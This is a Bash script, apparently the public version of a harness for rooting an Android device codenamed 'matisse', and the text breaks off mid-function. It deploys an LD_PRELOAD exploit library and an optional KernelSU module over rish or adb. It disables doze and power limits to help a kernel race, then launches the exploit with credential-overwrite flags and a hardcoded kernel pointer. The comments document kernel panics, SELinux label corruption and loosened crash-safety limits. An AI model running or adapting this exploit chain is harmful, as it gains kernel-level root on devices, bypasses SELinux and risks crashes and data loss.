#!/data/data/com.termux/files/usr/bin/bash
# ============================================================
# matisse KSU 持久化脚本 v8 (2026-10-02 laptop, 新增 USB adb 传输层)
#   v8 新增: MATISSE_ADB=1 → rsh/rpush 改用 adb shell / adb push (笔记本+数据线);
#            MATISSE_PREFLIGHT_ONLY=1 → 部署/取证/体检后停在开火前 (零内核写入);
#            WORK 自动指向脚本所在仓库 (笔记本模式不再 clone)。
# v7 (2026-09-10 helmsman, 基于 v6 照搬)
# 一行(装 KO, 推荐): HUNT_ALLOW_KO=1 bash ~/ksu_persist.sh [每boot R掷数=6]
# 只取 C 落地证据(不装模块): bash ~/ksu_persist.sh
# v7: 弹药 mt85->mt87(毒链自清); KO 可选武装(=bin/ksu/kernelsu_gki209_v2.ko，须显式授权);
#     R 轮 env 预开 PSELECT_KO(A1修复); 同boot R 重掷循环; E5 gate(E5a->E5b);
#     成功=内核模块留存(软重启不丢), 硬重启后需再次显式授权后重跑。
# 用法: `bash ~/ksu_persist.sh`                 — 默认无 KO (仅取 C 落地证据)
#       `HUNT_ALLOW_KO=1 bash ~/ksu_persist.sh` — 装填 KO (需用户明确授权!!)
# 序列: 部署(SHA门) → 取证 → 体检(load门15) → R → E5v3 → C → E5R → 回收回传
# 判据: ksu_done.txt / root_alive.txt / uname -n=glroot / ROOT-SEEN euid=0
# v6 修复 (审计详情见 REVIEW_2026-09-07_hunt_audit.md):
#   1. fire() C 轮 PSELECT_TASK 原追加在 `> ... 2>&1` 之后 → 成为 sleep 的
#      argv 而非环境变量 → `sleep: invalid time interval` → C 轮 100% 空转
#      (沙盒实测复现)。修: 并入 env 块 (run_c_strike.sh line 58 同款)。
#   2. E5→C 间 child 心跳新鲜度校验 (mt86 纪律移植, c-strike 有而 hunt 漏)。
#   3. load>15 铁律门 (原"仅记录"不拦截, 违反 09-06 软重启教训)。
#   4. KO 推送结果检查 (原 rpush 静默失败) + HUNT_ALLOW_KO 授权门
#      (既定用户规则: insmod/KSU 需另行授权, 脚本级强制)。
# ============================================================
set -u
# 默认不武装 KO；只有调用方显式设置 HUNT_ALLOW_KO=1 才允许加载。
: "${HUNT_ALLOW_KO:=0}"
# 兼容 ksu_load.sh 的 KSU_LOAD_ALLOW_KO=1 语义 (同一授权意图)
if [ "${KSU_LOAD_ALLOW_KO:-0}" = "1" ]; then HUNT_ALLOW_KO=1; fi
# ── v8: 笔记本/USB 传输层开关 ──
#   MATISSE_ADB=1             — 用 adb shell 代替 rish (USB 数据线, 推荐)
#   ADB_BIN=/路径/adb         — 指定 adb (默认自动查找仓库内 platform-tools)
#   MATISSE_PREFLIGHT_ONLY=1  — 只做部署/取证/体检, 停在开火前 (零内核写入)
MATISSE_ADB="${MATISSE_ADB:-0}"
MATISSE_PREFLIGHT_ONLY="${MATISSE_PREFLIGHT_ONLY:-0}"
# ── v8.1 调参开关 (依据 CHECKPOINT_mt79 / matisse_land.sh 的实证结论) ──
#   MATISSE_WINDOW=60   ⚠️ **危险，2026-10-02 实测把设备打重启** ⚠️
#                       pselect 窗口秒数（默认 20）。mt66 护栏的作用是「窗口关闭后
#                       拒绝盲写」；把窗口放宽 = 主动撤掉这道护栏。
#                       实证: WINDOW=20 那轮 miss 时输出 878KB 且零崩溃（护栏自保）；
#                       WINDOW=60 那轮 ~1 分钟内 kernel panic + 重启，R1.out 只剩
#                       1166 字节空白（stdio 缓冲未落盘）。**除非有新证据, 不要 >20。**
#   MATISSE_SPACING=200 轮次最小间隔秒 (文档: 120-200s, 确保上一轮彻底退场)
#   MATISSE_MAXFAIL=2   连续 R miss 上限 (mt79: 累计失败>=2 强制停手)
#   MATISSE_CBUDGET=2   每 boot 允许的 C 尝试次数 (MTK slab 铁律)
MATISSE_WINDOW="${MATISSE_WINDOW:-20}"
MATISSE_SPACING="${MATISSE_SPACING:-200}"
MATISSE_MAXFAIL="${MATISSE_MAXFAIL:-2}"
#   MATISSE_CBUDGET=5   每 boot 允许的 C 尝试次数。
#     原值 2 来自 MTK slab 铁律 (matisse_land.sh:420)。2026-10-02 22:15 用户要求放宽:
#     "不想疯狂撞大运" —— 与其跨 boot 重赌 R, 不如在同一个 R 窗口内多打几发 C
#     (R child 现在活 ~2h, C 每发 ~100s, 窗口绰绰有余; C 单发命中率 ~20%)。
#     代价: 每多发一次 = 多一次全量爆发 = 毒链后遗症累积, 崩机概率上升。实测可承受:
#     22:09 那轮 R + C1 + C2 三连爆发**未崩**(对比 21:39 的 R+C+E5 四连爆发崩了)。
MATISSE_CBUDGET="${MATISSE_CBUDGET:-5}"
#   MATISSE_CGAP=15     C 发之间的间隔秒 (让上一轮彻底退场)
MATISSE_CGAP="${MATISSE_CGAP:-15}"
#   MATISSE_SETTLE=240   开机 settle 下限(秒)。默认 240 (用户 2026-10-02 指定:
#                        "开机 settle 短点 4min 就够"), 便于利用 fresh boot 窗口。
MATISSE_SETTLE="${MATISSE_SETTLE:-240}"
#   MATISSE_R_EXTRA_ENV="PSELECT_NO_UNPOISON=1"  只给 R 轮追加实验 env (E5/C 不受影响)。
#     用途: mt87 的 UNPOISON 重构 (go 先置 + LOCK_PI 5s + route_done 延后) 疑似把消费者
#     burst 拖到 pselect 关窗之后 (t=20014ms), 而 mt85 时代是 t=50ms。此项做单变量 A/B。
MATISSE_R_EXTRA_ENV="${MATISSE_R_EXTRA_ENV:-}"
#   MATISSE_C_FIRST=1   阶段顺序: R -> C -> E5 -> ksud (接力文档 §3: "C 不需要 E5")。
#                       2026-10-02 21:14 教训: 旧顺序 R->E5->C 把 20min 的 R child 窗口
#                       烧在了 0/3 的 E5 上, 结果 C 一步都没打, R 状态过期作废。
#   MATISSE_CHILD_POLLS=36000  R child 的存活窗口 (mt84 的 PSELECT_CHILD_POLLS, 每 200ms 一次)
#                       6000≈20min(旧默认) → 36000≈**2 小时**(2026-10-02 用户明确要求"把 R 放心拉超长")。
#                       理由: 今晚 20min 窗口在 R 落地后只塞得下 3 发 E5, 窗口一过 R 状态即作废。
#                       ⚠️ 已知取舍: 活着的 child 会把毒链挂在活任务上, 历史(WILDPTR_INCIDENT_20260908)
#                       有 child 活数小时导致多次崩机+设置重置的案例 —— 用户知情并接受。
MATISSE_C_FIRST="${MATISSE_C_FIRST:-1}"
#   MATISSE_SKIP_E5=1  跳过 E5(Permissive) 阶段, 直接 R -> C -> ksud。
#     依据: ksud late-load 自带策略修补(改 policy 第23字节 + load_policy), 不依赖 Permissive;
#     且能避免同 boot 第三次全量爆发(21:39 崩机嫌疑)。需要老路线时设 0。
MATISSE_SKIP_E5="${MATISSE_SKIP_E5:-1}"
MATISSE_CHILD_POLLS="${MATISSE_CHILD_POLLS:-36000}"
WINDOW="$MATISSE_WINDOW"; SPACING="$MATISSE_SPACING"
SELF_DIR=$(cd "$(dirname "$0")" 2>/dev/null && pwd || echo "")
# 公开版: 不使用任何 git / 远端 / 凭据。
# 工作目录 = 脚本所在目录(即你 clone 下来的这个公开仓库); 可用 MATISSE_WORK 覆盖。
WORK="${MATISSE_WORK:-$SELF_DIR}"
[ -n "$WORK" ] || WORK="$PWD"
[ -d "$WORK" ] || WORK="$HOME/matisse"
mkdir -p "$WORK/logs_raw" 2>/dev/null
RUN_TS=$(date +%Y%m%d_%H%M%S)
# ── v8.30 (2026-10-03 10:40, BUG #18 结构性修复) ──
# 设备侧所有文件都放**每轮全新的目录**里:
#   ① 内核 SID 的 child 写过的文件会带坏 SELinux 标签(shell 连 ls/rm/adb push 都做不了,
#      restorecon 也修不了), 换目录/换名即可绕开 —— 每轮新目录天然隔离, 不再污染下一轮;
#   ② 弹药 .so/.ko、输出 .out、状态文件(mt49_child_status/root_alive/ksu_done/budget)全在该目录内。
# 调用方用 MATISSE_TMPD 指定; 默认仍是 /data/local/tmp。
TMPD="${MATISSE_TMPD:-/data/local/tmp}"
mkdir -p "$TMPD" 2>/dev/null
CONSOLE_LOG="$WORK/logs_raw/ksu_console_${RUN_TS}.log"
PUSHED=0; EXTRA=""
command -v termux-wake-lock >/dev/null 2>&1 && termux-wake-lock 2>/dev/null
exec > >(tee -a "$CONSOLE_LOG") 2>&1
say(){ echo "[hunt $(date +%H:%M:%S)] $*"; }
SHIZUKU_HINT="!! Shizuku 连接不稳: 设置->应用->Termux和Shizuku->省电策略[无限制], 插电+亮屏, 重跑本脚本"

# ── 0. 工作目录 (公开版: 无 git / 无远端 / 不 clone / 不 pull / 不 push) ──
say "第0步: 工作目录"
cd "$WORK" || { say "!! 工作目录不存在: $WORK"; exit 1; }
say "工作目录: $WORK"
[ -f "$WORK/bin/mt87/preload.so" ] || say "!! 提示: 未找到 payload ($WORK/bin/mt87/preload.so) — 请先用 payload_src/ 构建"

# ── 1. 传输层: USB adb (笔记本) 或 rish (手机 Shizuku) ──
if [ "$MATISSE_ADB" = "1" ]; then
  say "第1步: 传输层 = USB adb"
  if [ -z "${ADB_BIN:-}" ]; then
    for c in "$SELF_DIR/platform-tools_r33.0.2-windows/platform-tools/adb.exe" \
             "$SELF_DIR/platform-tools_r33.0.2-windows/platform-tools/adb" \
             "$SELF_DIR/platform-tools/adb" \
             "$(command -v adb 2>/dev/null || true)" \
             "$HOME/platform-tools/adb"; do
      if [ -n "$c" ] && [ -x "$c" ]; then ADB_BIN="$c"; break; fi
    done
  fi
  [ -n "${ADB_BIN:-}" ] || { say "!! 找不到 adb — 用 ADB_BIN=/路径/adb 指定"; exit 2; }
  mkdir -p "$WORK/.adb" 2>/dev/null
  # adb.exe 是原生 Windows 程序: 这个环境变量也必须是 Windows 路径, 否则 daemon
  # 重启时会因无法打开日志文件而起不来 (Permission denied)。
  if command -v cygpath >/dev/null 2>&1; then
    ANDROID_ADB_LOG_PATH=$(cygpath -w "$WORK/.adb/adb.log" 2>/dev/null || echo "$WORK/.adb/adb.log")
  else
    ANDROID_ADB_LOG_PATH="$WORK/.adb/adb.log"
  fi
  export ANDROID_ADB_LOG_PATH
  export MSYS_NO_PATHCONV=1 MSYS2_ARG_CONV_EXCL='*'
  ST=$("$ADB_BIN" get-state 2>&1 | tr -d '\r' | head -1)
  if [ "$ST" != "device" ]; then
    "$ADB_BIN" devices 2>&1 | sed 's/^/  adb| /'
    say "!! adb 状态=[$ST] — 手机解锁屏幕点『允许 USB 调试』后重跑"
    exit 2
  fi
  IDU=$("$ADB_BIN" shell id -u 2>&1 | tr -d '\r ')
  [ "$IDU" = "2000" ] || say "!! 注意: adb shell uid=[$IDU] (期望 2000 = shell 域)"
  say "adb 就绪: $ADB_BIN (uid=$IDU, shell 域, 无 seccomp)"
  TRANSPORT=adb
  # v8 修复: mt87 的毒链子进程会脱离设备端 timeout 并继承 adb shell 的 stdout,
  # 导致 adb shell 永不返回 -> 必须有客户端超时 (原 rish 版就是 timeout 包着的)。
  TIMEOUT_BIN=$(command -v timeout 2>/dev/null || true)
  [ -x /usr/bin/timeout ] && TIMEOUT_BIN=/usr/bin/timeout
  say "客户端超时工具: ${TIMEOUT_BIN:-无(不会超时!)}"
  rish_raw(){ local cmd="$1" t="${2:-60}"
    if [ -n "$TIMEOUT_BIN" ]; then "$TIMEOUT_BIN" "$t" "$ADB_BIN" shell "$cmd" 2>&1 | tr -d '\r'
    else "$ADB_BIN" shell "$cmd" 2>&1 | tr -d '\r'; fi; }
  rsh1(){ rish_raw "$1" "${2:-60}"; }
  rsh(){ local cmd="$1" t="${2:-60}" out i
    for i in 1 2 3 4; do
      out=$(rsh1 "$cmd" "$t")
      printf '%s' "$out" | grep -qE "device offline|device not found|error: closed|^adb: error|Request timeout" || { printf '%s\n' "$out"; return 0; }
      [ "$i" -lt 4 ] && say "adb 闪断(第${i}次), 8s 重试..." >&2
      sleep 8
    done; printf '%s\n' "$out"; return 1; }
  rpush(){ local l="$1" r="$2" out i lw
    lw="$l"
    # adb.exe 是原生 Windows 程序: 本地路径必须转成 Windows 形式 (MSYS_NO_PATHCONV 会拦住自动转换)
    if command -v cygpath >/dev/null 2>&1; then lw=$(cygpath -w "$l" 2>/dev/null || echo "$l"); [ -n "$lw" ] || lw="$l"; fi
    for i in 1 2 3; do
      out=$("$ADB_BIN" push "$lw" "$r" 2>&1)
      if printf '%s' "$out" | grep -qiE "^adb: error|failed to copy|No such file"; then
        [ "$i" -lt 3 ] && { say "推送失败(第${i}次): $(printf '%s' "$out" | tail -1)" >&2; sleep 5; continue; }
        printf '%s\n' "$out"; return 1
      fi
      printf '%s\n' "$out"; return 0
    done; }
else
say "第1步: rish"
RISH=""
for c in "$HOME/rish" "$HOME/rish/rish" "/sdcard/Download/rish" "/storage/emulated/0/Download/rish" "${TMPD}/rish"; do
  [ -f "$c" ] && RISH="$c" && break
done
[ -z "$RISH" ] && RISH=$(find "$HOME" -maxdepth 3 -name rish -type f 2>/dev/null | head -1)
[ -z "$RISH" ] && { say "!! 没找到 rish (Shizuku app→复制 rish→~/)"; exit 2; }
RISH_DIR=$(dirname "$RISH"); chmod +x "$RISH" 2>/dev/null
RISH_MODE=""
for _m in stdin c args; do
  for _try in 1 2 3; do
    case "$_m" in
      c)    OUT=$( (cd "$RISH_DIR" && timeout 25 ./rish -c 'echo RISH_OK_$(id -u)' </dev/null) 2>&1 ) ;;
      args) OUT=$( (cd "$RISH_DIR" && timeout 25 ./rish 'echo RISH_OK_$(id -u)') 2>&1 ) ;;
      *)    OUT=$( (cd "$RISH_DIR" && echo 'echo RISH_OK_$(id -u)' | timeout 25 ./rish) 2>&1 ) ;;
    esac
    if printf "%s" "$OUT" | grep -q "RISH_OK_"; then RISH_MODE="$_m"; RISH_OUT="$OUT"; break 2; fi
    sleep 5
  done
done
if [ -z "$RISH_MODE" ]; then
  say "!! rish unavailable (Shizuku frozen/not running?) last=[$(printf "%s" "$OUT" | head -c 100)]"
  exit 2
fi
say "rish 模式=$RISH_MODE 身份: $(printf '%s' "$RISH_OUT" | tr '\n' ' ')"
rish_raw(){ local cmd="$1" t="$2"
  case "$RISH_MODE" in
    c)    (cd "$RISH_DIR" && timeout "$t" ./rish -c "$cmd" </dev/null) 2>&1 ;;
    args) (cd "$RISH_DIR" && timeout "$t" ./rish "$cmd") 2>&1 ;;
    *)    printf "%s\n" "$cmd" | (cd "$RISH_DIR" && timeout "$t" ./rish) 2>&1 ;;
  esac; }
rsh1(){ rish_raw "$1" "${2:-60}"; }
rsh(){ local cmd="$1" t="${2:-60}" out i
  for i in 1 2 3 4; do
    out=$(rsh1 "$cmd" "$t")
    printf '%s' "$out" | grep -q "Request timeout\|blocked by your system" || { printf '%s\n' "$out"; return 0; }
    if [ "$i" = "3" ]; then
      case "$RISH_MODE" in stdin) RISH_MODE=c ;; *) RISH_MODE=stdin ;; esac
      say "rish mode auto-switch -> $RISH_MODE" >&2
    fi
    [ "$i" -lt 4 ] && say "Shizuku 闪断(第${i}次), 8s 重试..." >&2
    sleep 8
  done; printf '%s\n' "$out"; return 1; }
rpush(){ local l="$1" r="$2" out i
  for i in 1 2 3 4; do
    if [ "$RISH_MODE" = args ]; then out=$( (cd "$RISH_DIR" && timeout 180 ./rish "cat > '$r'") < "$l" 2>&1 )
    else out=$( { echo "cat > '$r'"; cat "$l"; } | (cd "$RISH_DIR" && timeout 180 ./rish) 2>&1 ); fi
    printf '%s' "$out" | grep -q "Request timeout\|blocked by your system" || { printf '%s\n' "$out"; return 0; }
    [ "$i" -lt 4 ] && say "推送闪断(第${i}次), 8s 重试..." >&2
    sleep 8
  done; printf '%s\n' "$out"; return 1; }
TRANSPORT=rish
fi

# ── 2. 部署 mt87 (SHA 门) + GKI KernelSU 模块 ──
# v8.4: 弹药可换 (单变量对照用) — MATISSE_PRELOAD_BIN=bin/mt86/preload.so
PBIN="${MATISSE_PRELOAD_BIN:-bin/mt87/preload.so}"
# ── v8.29 (2026-10-03 10:33, BUG #18 实测) ──
# 内核 SID 的 child 写过的文件会被打上坏 SELinux 标签 ⇒ 之后 shell 连 ls/rm/adb push 都做不了
# (2026-10-03 10:32 真实发生: preload.so 与 kernelsu_gki209.ko 变成 Permission denied,
#  restorecon 也修不了, 但新目录/新文件名完全正常)。故设备侧弹药路径可换:
#   MATISSE_PRELOAD_DEV=${TMPD}/preload_v2.so MATISSE_KO_DEV=${TMPD}/ko_v2.ko
PRELOAD_DEV="${MATISSE_PRELOAD_DEV:-${TMPD}/preload.so}"
KO_DEV="${MATISSE_KO_DEV:-${TMPD}/kernelsu_gki209.ko}"
KO_LATE="${MATISSE_KO_LATE:-${TMPD}/ko_late.ko}"   # v8.39 遗留(预开失败→门槛重开), v8.44 起默认不用
# ── v8.44 (2026-10-03 14:05, B 路线) ──
# 病因链(今日实测): 预开 KO 拿到**低号 fd(3)** ⇒ exploit 自己的 prep(272+204+33+34 克隆+管道)
# 把低号 fd churn 掉 ⇒ 门槛时刻 finit_module(3) = EBADF(errno=9) ✗ (11:42 那轮实证)。
# 对策: 开火前先经 `fdsh2.sh` **占位 fd 3..60**(每个都打开同一份 KO) ⇒ exploit 的预开落到
# **高位 fd** ⇒ 避开 churn; 且占位 fd 本身就是有效 KO fd, 不需要门槛后再 open(那条会 EACCES ✗)。
FDSH="${MATISSE_FDSHIELD:-${TMPD}/fdsh_good.sh}"
PDIR=$(dirname "$PBIN")
say "第2步: 部署 $PBIN + GKI kernelsu.ko"
[ -f "$WORK/$PBIN" ] || { say "!! 无 $PBIN"; exit 3; }
SHA_EXP=$(grep -ao '[0-9a-f]\{64\}' "$WORK/$PDIR/BUILD_INFO.txt" 2>/dev/null | head -1)
rpush "$WORK/$PBIN" "$PRELOAD_DEV.new" >/dev/null
rsh "mv -f $PRELOAD_DEV.new $PRELOAD_DEV; chmod 644 $PRELOAD_DEV" 30 >/dev/null
# KO 装填：默认关闭；HUNT_ALLOW_KO=1 显式授权后仍须通过本地/远端 SHA-256 门。
KOV=""
if [ "${HUNT_ALLOW_KO:-0}" = "1" ]; then
  # v8.33 (2026-10-03 11:0x, 采纳 GhostLock 文档的混合路线): 设备上是 **ksud 3.3.0 + 管理器 v3.3.0**,
# 而 v2 模块(386a0842, __versions=4096, vermagic 5.10.245)与之不配对; 文档 10-02 用的是
# **空 __versions 段**版(ko_patched/*_emptyver.ko)。默认改用 v330_emptyver(5ca70d23)。
KO_BIN="${MATISSE_KO_BIN:-bin/ksu/kernelsu_gki209_v330.ko}"
if [ -f "$WORK/$KO_BIN" ]; then
    rpush "$WORK/$KO_BIN" "$KO_DEV" >/dev/null \
      || say "!! KO 推送失败 (rish 闪断) — C 轮将无 KO"
    rsh "chmod 644 $KO_DEV" 20 >/dev/null
    SHA_KO_EXPECTED=$(sha256sum "$WORK/$KO_BIN" | awk '{print $1}')
    SHA_KO_GOT=$(rsh "sha256sum $KO_DEV 2>/dev/null | awk '{print \$1}'" 30 | tr -d '\r')
    if [ -n "$SHA_KO_EXPECTED" ] && [ "$SHA_KO_GOT" = "$SHA_KO_EXPECTED" ]; then
      KOV="$KO_DEV"
      say "KO 已武装且 SHA-256 已验证: ${SHA_KO_GOT:0:16}..."
    else
      say "!! KO SHA-256 不一致/不可读，C 轮将无 KO (expected=${SHA_KO_EXPECTED:0:16}... got=${SHA_KO_GOT:0:16}...)"
    fi
    say "GKI ko: 布局已对齐设备(config 实证), 63导入全导出, 29符号走kprobe resolver(硬失败), CFI桩就位; 加载 flags=3"
  else
    say "!! $KO_BIN 不在本地克隆 (未归档资产) — 无 KO 模式"
  fi
else
  say "HUNT_ALLOW_KO!=1 — C 轮仅取 C 落地证据, 不装填模块"
fi
SHA_GOT=$(rsh "sha256sum $PRELOAD_DEV" 30 | tr -d '\r' | awk '{print $1}')
say "SHA 期望=${SHA_EXP:0:16}... 实际=${SHA_GOT:0:16}..."
if [ -n "$SHA_EXP" ] && [ "$SHA_GOT" != "$SHA_EXP" ]; then
  case "$SHA_GOT" in *timeout*|*blocked*) say "$SHIZUKU_HINT";; *) say "!! SHA 不一致, 中止";; esac
  exit 3
fi
# v8.18 (2026-10-03 02:28): 这行原来把版本号写死成 "mt87" —— 换弹药做 A/B 时会把分析带偏
# (实测: 用 bin/mt85 跑, 日志仍写 "二进制校验通过 (mt87: ...)")。改为从 $PBIN 路径取真版本号。
PBVER=$(printf '%s' "$PBIN" | awk -F/ '{for(i=1;i<=NF;i++) if($i ~ /^mt[0-9]+$/) v=$i} END{print v}')
say "二进制校验通过 (${PBVER:-未知版本}: KO fd 预开 + gate)"

# ── 3. 取证 (零开火): 残留 → 请求重启 ──
say "第3步: 取证"
FORENSIC="$WORK/logs_raw/hunt_forensic_${RUN_TS}.txt"
{ rsh "date; cat /proc/sys/kernel/random/boot_id; getenforce; cat /proc/loadavg; cat /proc/uptime"
  echo "--- residue ---"
  rsh 'for p in $(pgrep -x sleep 2>/dev/null); do cl=$(tr "\0" " " < /proc/$p/cmdline 2>/dev/null); case "$cl" in *"sleep 180"*) echo "== pid $p ($cl) =="; for t in /proc/$p/task/*; do echo "tid=$(basename $t) st=$(cut -d" " -f3 $t/stat 2>/dev/null) wchan=$(cat $t/wchan 2>/dev/null)"; done;; esac; done' 60
} > "$FORENSIC" 2>&1
RES=$(grep -c "tid=" "$FORENSIC" 2>/dev/null); STUCK=$(grep -o "state=[DR]" "$FORENSIC" 2>/dev/null | wc -l)
say "取证: 线程=$RES D/R=$STUCK"
if [ "${RES:-0}" -gt 0 ]; then
  say "!! 有残留进程 (D/R=$STUCK) — 请重启手机, 10 分钟后重跑本脚本"
  cp "$CONSOLE_LOG" "$WORK/logs_raw/ksu_console_${RUN_TS}.log" 2>/dev/null
  say "证据已留在本地: $WORK/logs_raw/ksu_console_${RUN_TS}.log (公开版不做任何提交/推送)"
  exit 5
fi
say "无残留, 继续"

# ── 4. 体检 ──
say "第4步: 体检"
BOOT0=$(rsh "cat /proc/sys/kernel/random/boot_id" 20 | tr -d '\r')
printf '%s' "$BOOT0" | grep -qE '^[0-9a-f]{8}-' || { say "!! BOOT0 非 UUID: Shizuku 不稳, 停"; exit 4; }
ENF0=$(rsh "getenforce" 20 | tr -d '\r')
[ "$ENF0" = "Enforcing" ] || { say "!! enforce=$ENF0 非预期"; exit 4; }
while :; do
  UP=$(rsh "awk '{print int(\$1)}' /proc/uptime" 20 | tr -d '\r')
  case "$UP" in ''|*[!0-9]*) sleep 10; continue;; esac
  [ "$UP" -ge "$MATISSE_SETTLE" ] && break
  say "开机仅 ${UP}s, settle (门=${MATISSE_SETTLE}s)..."; sleep 60
done
LOAD0=$(rsh "cat /proc/loadavg" 20 | tr -d '\r')
LOAD_INT=${LOAD0%%.*}
case "$LOAD_INT" in ''|*[!0-9]*) LOAD_INT=99;; esac
if [ "$LOAD_INT" -gt 25 ]; then
  say "!! load=$LOAD0 > 25 (MIUI baseline ~16; strict 15 refused every run) - wait and rerun"
  exit 6
fi
say "体检 OK: boot=$(printf '%s' "$BOOT0" | cut -c1-8) enforce=$ENF0 load=$LOAD0 uptime=$(rsh 'cut -d. -f1 /proc/uptime' 15 | tr -d '\r')s"
# v8.15 (2026-10-03 01:18 审计): 记录**开火时刻的开机时长**。
# 动机: 今晚 3 次 R 落地都发生在 uptime ≥5min 的开机上, 而改成 SETTLE=120 后连续 miss。
# 假设(未证实): MIUI 开机后几分钟的后台 dexopt/媒体扫描会加剧争用, 让 burst 迟到。
# 只记录不改行为 —— 等一夜的数据看「落地 vs 开机时长」的相关性再决定 SETTLE。

# v7.1: Shizuku 抗冻加固 (best-effort)
# v8.13 (2026-10-03 00:57 夜跑 BUG 修复): **崩机重启会把屏幕设置回滚**
#   实测: 设了 screen_off_timeout=2147483647 / stay_on_while_plugged_in=15,
#         R 轮崩机重启后变回 300000 / 0 (与之前 rm 被回滚同类: 断电时未落盘)。
#   屏幕一旦熄灭, MIUI 会让后台进程进 doze, 直接毁掉竞态时序 ⇒ 每轮都必须重设。
# v8.17 (2026-10-03 01:23 定时审计): 只设超时不够 —— 崩机重启后屏幕可能**已经熄了**,
# 而坚化阶段在 settle 之后才跑; 屏幕熄灭会让 MIUI 进 doze, 毁掉竞态时序。
# 所以先**唤醒屏幕**(keyevent 224 = KEYCODE_WAKEUP), 再设超时, 并打印醒来状态做证据。
rsh "input keyevent 224 2>/dev/null; input keyevent KEYCODE_WAKEUP 2>/dev/null; settings put system screen_off_timeout 2147483647 2>/dev/null; settings put global stay_on_while_plugged_in 7 2>/dev/null" 25 >/dev/null 2>&1
rsh "svc power stayon ac 2>/dev/null; svc power stayon true 2>/dev/null" 20 >/dev/null 2>&1
# v8.16 (2026-10-03 01:24 审计): 补上 9/08 成功配置里有、我们却漏掉的一步 —— `am kill-all`。
# 历史唯一成功的脚本 (termux/run_c_strike.sh:10) 开火前先清后台; 我们没有。
# 动机: 今晚所有 miss 都是「burst 迟到」(mt66 window closed), 属争用型症状; 清掉后台进程可降 CPU 争用。
rsh "am kill-all 2>/dev/null" 25 >/dev/null 2>&1
# v8.21 (2026-10-03 02:55 审计): 把 Doze/闲时限制彻底关掉并固定在前台性能档 —— 消除"系统把
# CPU 调度收着"这个变量(它足以毁掉竞态时序)。全部可逆; 实测当时 mState=ACTIVE(未在 doze),
# 但显式禁用后就不再有"跑着跑着进 doze"的可能。
rsh "dumpsys deviceidle disable 2>/dev/null; settings put global low_power 0 2>/dev/null; cmd power set-fixed-performance-mode-enabled true 2>/dev/null" 25 >/dev/null 2>&1
rsh "cmd appops set moe.shizuku.privileged.api RUN_IN_BACKGROUND allow 2>/dev/null; cmd appops set com.termux RUN_IN_BACKGROUND allow 2>/dev/null; dumpsys deviceidle whitelist +moe.shizuku.privileged.api 2>/dev/null" 30 >/dev/null 2>&1
say "坚化: 唤醒+亮屏超时=$(rsh 'settings get system screen_off_timeout' 20 | tr -d '\r') $(rsh "dumpsys power 2>/dev/null | grep -m1 'mWakefulness='" 20 | tr -d '\r') +doze off $(rsh "dumpsys deviceidle 2>/dev/null | grep -m1 -o 'mState=[A-Z]*'" 20 | tr -d '\r') +am kill-all+appops"

# ── 5. 开火机器 ──
cleangate(){ local i
  for i in 1 2 3 4; do
    # ── v8.35 (2026-10-03 11:38, 用户指出"尸检没弄好") ──
    # 这一步原本直接 rm 掉标记文件 ⇒ **上一轮的落地/模块证据被下一轮开头毁尸灭迹** ✗
    # (09:55 那次 root_alive.txt 有 pid=10553 uid=0 euid=0, 之后再查就 No such file ✗)。
    # 现在删之前**先归档**到带时间戳的目录, 尸检就能取到。
    rsh "if [ -s ${TMPD}/root_alive.txt ] || [ -s ${TMPD}/ksu_done.txt ]; then A=${TMPD}/markers_$(date +%Y%m%d_%H%M%S); mkdir -p \$A 2>/dev/null; cp -f ${TMPD}/root_alive.txt \$A/ 2>/dev/null; cp -f ${TMPD}/ksu_done.txt \$A/ 2>/dev/null; cp -f ${TMPD}/mt49_child_status.txt \$A/ 2>/dev/null; cp -f ${TMPD}/ksu_go.log \$A/ 2>/dev/null; echo \"archived markers -> \$A\"; fi" 25 >/dev/null 2>&1
    rsh "rm -f ${TMPD}/mt49_child_status.txt ${TMPD}/root_alive.txt ${TMPD}/ksu_done.txt ${KO_LATE}" 20 >/dev/null
    GONE=$(rsh "ls ${TMPD}/mt49_child_status.txt ${TMPD}/root_alive.txt 2>/dev/null | wc -l" 20 | tr -d '\r ')
    [ "$GONE" = "0" ] && return 0
    say "门槛文件未删净, 重试 $i..."
  done; return 1; }
fire(){
  local name="$1" kind="$2" task="$3" te="" cmd tskenv koflag cpid
  # v6 关键修复: PSELECT_TASK/PSELECT_KO 必须在 env 块内 (重定向前)。
  # 原版追加在 `> $name.out 2>&1` 之后 → 成为 sleep 的 argv → 触发器 100% 不运行。
  tskenv=""; [ -n "$task" ] && tskenv="PSELECT_TASK=$task"
  # ── v8.39 (2026-10-03 11:50, 依据 R1.out + main.c 的实证) ──
  # 病因: 预开 KO fd(fd=3) 在 prep 阶段被 exploit 自己的克隆/管道 churn 占用 ⇒ 门槛那一刻
  # finit_module(3) 返回 EBADF(errno=9) ⇒ 模块永远装不上(这就是"越狱失败"的精确原因)。
  # 源码 (main.c:744) 的兜底是: 若预开失败(mt85_kfd<0) ⇒ 门槛那一刻**重新 open(PSELECT_KO)**。
  # 而门槛后 child 是 uid=0+满caps+Permissive, 实测能成功写文件(root_alive.txt ✓) ⇒ 新 open 必成。
  # 所以: PSELECT_KO 指向一个**开火时不存在、门槛前才出现**的路径 ko_late.ko ⇒ 强制走那条兜底。
  koflag=""; [ -n "$KOV" ] && koflag="PSELECT_KO=$KO_DEV"
  case "$kind" in
    R)  cmd="timeout 86400 env PSELECT_HOLD=1 PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=R PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0 PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=${MATISSE_R_WINDOW:-$WINDOW} PSELECT_NO_CANARY=1 ${MATISSE_R_EXTRA_ENV:-} PSELECT_CHILD_POLLS=${MATISSE_CHILD_POLLS:-36000} $koflag LD_PRELOAD=$PRELOAD_DEV /system/bin/sleep 180 > ${TMPD}/$name.out 2>&1" ;;
